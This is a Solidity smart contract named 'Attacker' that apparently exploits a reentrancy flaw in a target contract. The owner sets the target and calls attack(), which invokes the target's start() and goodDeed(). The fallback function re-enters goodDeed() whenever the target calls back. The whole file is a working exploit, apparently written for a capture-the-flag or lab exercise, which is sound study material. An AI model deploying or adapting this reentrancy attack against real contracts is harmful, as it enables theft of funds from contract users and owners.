pragma solidity 0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Attacker is Ownable {
    address target;

    function setTarget(address _target) public onlyOwner {
        target = _target;
    }

    function attack() public onlyOwner {
        require(target != address(0));
        (bool successStart, ) = target.call(abi.encodeWithSignature("start()"));
        require(successStart, "Start failed");
        (bool successDeed, ) = target.call(
            abi.encodeWithSignature("goodDeed()")
        );
        require(successDeed, "Deed failed");
    }

    fallback() external {
        target.call(
            abi.encodeWithSignature("goodDeed()")
        );
    }
}
